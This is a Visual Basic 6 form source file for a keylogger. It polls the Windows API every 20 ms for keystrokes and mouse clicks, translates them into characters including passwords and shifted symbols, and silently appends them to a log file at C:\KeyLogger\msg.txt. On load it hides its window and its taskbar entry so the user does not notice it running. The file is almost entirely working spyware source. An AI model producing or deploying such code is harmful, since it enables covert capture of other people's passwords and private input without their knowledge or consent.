VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   4590
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   8085
   LinkTopic       =   "Form1"
   ScaleHeight     =   4590
   ScaleWidth      =   8085
   StartUpPosition =   3  '系統預設值
   Begin VB.TextBox MouseEvent 
      Height          =   2775
      Left            =   3720
      TabIndex        =   1
      Top             =   480
      Width           =   3615
   End
   Begin VB.TextBox PressedKeyBox 
      Height          =   2775
      Left            =   480
      TabIndex        =   0
      Top             =   480
      Width           =   3135
   End
   Begin VB.Timer Timer1 
      Interval        =   20
      Left            =   6000
      Top             =   3600
   End
   Begin VB.Timer Timer_KeyPress 
      Interval        =   20
      Left            =   2520
      Top             =   3480
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
' record key board events
' for creating a file
Dim newFIle
Dim FSO
' end creating a file

Dim fileSize As Long
Dim LastKey As String
Dim KeyLoop As Integer
Dim KeyResult As Integer
Dim FileName As String
Dim ShiftDown As Boolean
Dim strS As String
Dim FileNum As Integer
Dim a As String

' for checking whether a file exists or not
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Private Type POINTAPI
    x As Long
    y As Long
End Type
Dim mouseCursorPos As POINTAPI

Private Const OF_EXIST         As Long = &H4000
Private Const OFS_MAXPATHNAME  As Long = 128
Private Const HFILE_ERROR      As Long = -1

Private Type OFSTRUCT
    cBytes As Byte
    fFixedDisk As Byte
    nErrCode As Integer
    Reserved1 As Integer
    Reserved2 As Integer
    szPathName(OFS_MAXPATHNAME) As Byte
End Type

Private Declare Function OpenFile Lib "kernel32" (ByVal lpFileName As String, _
                        lpReOpenBuff As OFSTRUCT, ByVal wStyle As Long) As Long

Public Function FileExists(ByVal Fname As String) As Boolean

    Dim lRetVal As Long
    Dim OfSt As OFSTRUCT
    
    lRetVal = OpenFile(Fname, OfSt, OF_EXIST)
    If lRetVal <> HFILE_ERROR Then
        FileExists = True
    Else
        FileExists = False
    End If
    
End Function
' end checking whether a file exists or not
' Virtual Key Code
Public Function PressedKey() As String
    Dim AddKey
    PressedKey = "null"
    
    KeyResult = GetAsyncKeyState(16) 'shift key
    If KeyResult = -32767 Or KeyResult = -32768 Then
        'PressedKey = "[SHIFT]"
        ShiftDown = True
        'Exit Function
    Else
        ShiftDown = False
    End If
    
    KeyResult = GetAsyncKeyState(&H30)
    If KeyResult = -32767 And ShiftDown = False Then
        PressedKey = "0"
        Exit Function
    ElseIf KeyResult = -32767 And ShiftDown = True Then
        PressedKey = ")"
        Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(&H31)
    If KeyResult = -32767 And ShiftDown = False Then
        PressedKey = "1"
        Exit Function
    ElseIf KeyResult = -32767 And ShiftDown = True Then
        PressedKey = "!"
        Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(&H32)
    If KeyResult = -32767 And ShiftDown = False Then
        PressedKey = "2"
        Exit Function
    ElseIf KeyResult = -32767 And ShiftDown = True Then
        PressedKey = "@"
        Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(&H33)
    If KeyResult = -32767 And ShiftDown = False Then
        PressedKey = "3"
        Exit Function
    ElseIf KeyResult = -32767 And ShiftDown = True Then
        PressedKey = "#"
        Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(&H34)
    If KeyResult = -32767 And ShiftDown = False Then
        PressedKey = "4"
        Exit Function
    ElseIf KeyResult = -32767 And ShiftDown = True Then
        PressedKey = "$"
        Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(&H35)
    If KeyResult = -32767 And ShiftDown = False Then
        PressedKey = "5"
        Exit Function
    ElseIf KeyResult = -32767 And ShiftDown = True Then
        PressedKey = "%"
        Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(&H36)
    If KeyResult = -32767 And ShiftDown = False Then
        PressedKey = "6"
        Exit Function
    ElseIf KeyResult = -32767 And ShiftDown = True Then
        PressedKey = "^"
        Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(&H37)
    If KeyResult = -32767 And ShiftDown = False Then
        PressedKey = "7"
        Exit Function
    ElseIf KeyResult = -32767 And ShiftDown = True Then
        PressedKey = "&"
        Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(&H38)
    If KeyResult = -32767 And ShiftDown = False Then
        PressedKey = "8"
        Exit Function
    ElseIf KeyResult = -32767 And ShiftDown = True Then
        PressedKey = "*"
        Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(&H39)
    If KeyResult = -32767 And ShiftDown = False Then
        PressedKey = "9"
        Exit Function
    ElseIf KeyResult = -32767 And ShiftDown = True Then
        PressedKey = "("
        Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(13) ' carriage return
    'PressedKeyBox.Text = KeyResult
    If KeyResult = -32767 Then
    PressedKey = "[ENTER]"
    Exit Function
    End If
        
    KeyResult = GetAsyncKeyState(17) 'Ctrl key
    If KeyResult = -32767 Then
    PressedKey = "[CTRL]"
    Exit Function
    End If
    
    
    KeyResult = GetAsyncKeyState(8) 'Backspace
    If KeyResult = -32767 Then
    PressedKey = "[BKSPACE]"
    Exit Function
    End If
    
    
    KeyResult = GetAsyncKeyState(9)
    If KeyResult = -32767 Then
    PressedKey = "[TAB]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(18)
    If KeyResult = -32767 Then
    PressedKey = "[ALT]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(19)
    If KeyResult = -32767 Then
    PressedKey = "[PAUSE]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(20)
    If KeyResult = -32767 Then
    PressedKey = "[CAPS]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(27)
    If KeyResult = -32767 Then
    PressedKey = "[ESC]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(33)
    If KeyResult = -32767 Then
    PressedKey = "[PGUP]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(34)
    If KeyResult = -32767 Then
    PressedKey = "[PGDN]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(35)
    If KeyResult = -32767 Then
    PressedKey = "[END]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(36)
    If KeyResult = -32767 Then
    PressedKey = "[HOME]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(44)
    If KeyResult = -32767 Then
    PressedKey = "[SYSRQ]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(45)
    If KeyResult = -32767 Then
    PressedKey = "[INS]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(46)
    If KeyResult = -32767 Then
    PressedKey = "[DEL]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(144)
    If KeyResult = -32767 Then
    PressedKey = "[NUM]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(37)
    If KeyResult = -32767 Then
    PressedKey = "[LEFT]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(38)
    If KeyResult = -32767 Then
    PressedKey = "[UP]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(39)
    If KeyResult = -32767 Then
    PressedKey = "[RIGHT]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(40)
    If KeyResult = -32767 Then
    PressedKey = "[DOWN]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(112)
    If KeyResult = -32767 Then
    PressedKey = "[F1]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(113)
    If KeyResult = -32767 Then
    PressedKey = "[F2]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(114)
    If KeyResult = -32767 Then
    PressedKey = "[F3]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(115)
    If KeyResult = -32767 Then
    PressedKey = "[F4]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(116)
    If KeyResult = -32767 Then
    PressedKey = "[F5]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(117)
    If KeyResult = -32767 Then
    PressedKey = "[F6]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(118)
    If KeyResult = -32767 Then
    PressedKey = "[F7]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(119)
    If KeyResult = -32767 Then
    PressedKey = "[F8]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(120)
    If KeyResult = -32767 Then
    PressedKey = "[F9]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(121)
    If KeyResult = -32767 Then
    PressedKey = "[F10]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(122)
    If KeyResult = -32767 Then
    PressedKey = "[F11]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(123)
    If KeyResult = -32767 Then
    PressedKey = "[F12]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(124)
    If KeyResult = -32767 Then
    PressedKey = "[F13]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(125)
    If KeyResult = -32767 Then
    PressedKey = "[F14]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(126)
    If KeyResult = -32767 Then
    PressedKey = "[F15]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(127)
    If KeyResult = -32767 Then
    PressedKey = "[F16]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(32)
    If KeyResult = -32767 Then
    PressedKey = " "
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(186)
    If KeyResult = -32767 Then
    PressedKey = ";"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(187)
    If KeyResult = -32767 Then
    PressedKey = "="
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(188)
    If KeyResult = -32767 Then
    PressedKey = ","
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(189)
    If KeyResult = -32767 Then
    PressedKey = "-"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(190)
    If KeyResult = -32767 And ShiftDown = False Then
        PressedKey = "."
        Exit Function
    ElseIf KeyResult = -32767 And ShiftDown = True Then
        PressedKey = ">"
        Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(191)
    If KeyResult = -32767 And ShiftDown = False Then
        PressedKey = "/"
        Exit Function
    ElseIf KeyResult = -32767 And ShiftDown = True Then
        PressedKey = "?"
        Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(192)
    If KeyResult = -32767 Then
    PressedKey = "`" '`
    Exit Function
    End If
    
    '----------NUM PAD
    KeyResult = GetAsyncKeyState(96)
    If KeyResult = -32767 Then
    PressedKey = "0"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(97)
    If KeyResult = -32767 Then
    PressedKey = "1"
    Exit Function
    End If
    
    
    KeyResult = GetAsyncKeyState(98)
    If KeyResult = -32767 Then
    PressedKey = "2"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(99)
    If KeyResult = -32767 Then
    PressedKey = "3"
    Exit Function
    End If
    
    
    KeyResult = GetAsyncKeyState(100)
    If KeyResult = -32767 Then
    PressedKey = "4"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(101)
    If KeyResult = -32767 Then
    PressedKey = "5"
    Exit Function
    End If
    
    
    KeyResult = GetAsyncKeyState(102)
    If KeyResult = -32767 Then
    PressedKey = "6"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(103)
    If KeyResult = -32767 Then
    PressedKey = "7"
    Exit Function
    End If
    
    
    KeyResult = GetAsyncKeyState(104)
    If KeyResult = -32767 Then
    PressedKey = "8"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(105)
    If KeyResult = -32767 Then
    PressedKey = "9"
    Exit Function
    End If
    
    
    KeyResult = GetAsyncKeyState(106)
    If KeyResult = -32767 Then
    PressedKey = "*"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(107)
    If KeyResult = -32767 Then
    PressedKey = "+"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(108)
    If KeyResult = -32767 Then
    PressedKey = "[ENTER]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(109)
    If KeyResult = -32767 Then
    PressedKey = "-"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(110)
    If KeyResult = -32767 Then
        PressedKey = "."
        Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(2)
    If KeyResult = -32767 Then
        PressedKey = "[RM]"
        Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(1)
    If KeyResult = -32767 Then
        PressedKey = "[LM]"
        Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(220)
    If KeyResult = -32767 Then
    PressedKey = "\"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(222)
    If KeyResult = -32767 Then
    PressedKey = "'"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(221)
    If KeyResult = -32767 Then
    PressedKey = "]"
    Exit Function
    End If
    
    KeyResult = GetAsyncKeyState(219)
    If KeyResult = -32767 Then
    PressedKey = "["
    Exit Function
    End If
            
    KeyLoop = &H41
    Do Until KeyLoop = &H5B 'show other keys
    KeyResult = GetAsyncKeyState(KeyLoop)
    If KeyResult = -32767 Then
        PressedKey = Chr(KeyLoop)
    End If
    KeyLoop = KeyLoop + 1
    Loop
    LastKey = PressedKey
    Exit Function
    
'KeyFound: 'show what you've entered
    'PressedKeyBox = PressedKeyBox & AddKey
End Function

Private Sub Form_Load()
    ShiftDown = False
    Me.Hide
    App.TaskVisible = False
End Sub
Public Function DirExists(ByVal strDirName As String) As Boolean
    Const gstrNULL$ = ""
    Dim strDummy As String
    
    strDummy = Dir$(strDirName, vbDirectory)
    If strDummy = gstrNULL$ Then
    DirExists = False
    Else
    DirExists = True
    End If
End Function


Private Sub Timer1_Timer()
    GetCursorPos mouseCursorPos 'assign mouseCursorPos the position of the mouse
    MouseEvent.Text = "(" + CStr(mouseCursorPos.x) + ", " + CStr(mouseCursorPos.y) + ")"
End Sub

Private Sub Timer_KeyPress_Timer() 'write keylog into a file
    Dim buffer As String
    Dim location As String
    location = "C:\KeyLogger"
    buffer = PressedKey()
    If (buffer <> "null") Then
        'FileName = "C:\ChiaoTung\msg.txt"
        FileName = location + "\msg.txt"
        If DirExists(location) = False Then 'check if the dir exists or not
            MkDir (location)
        End If
        strS = PressedKeyBox.Text
        On Error GoTo AWError
        If Len(Dir(FileName, vbArchive Or vbHidden Or vbNormal Or vbReadOnly)) = 0 Then
            fileSize = 0
        Else
            fileSize = FileLen(FileName)
        End If
        FileNum = FreeFile
        Open FileName For Binary As FileNum
        Seek FileNum, fileSize + 1
            Put FileNum, , buffer
        Close FileNum
    End If
Exit Sub
    
AWError:
    'MsgBox Error
End Sub
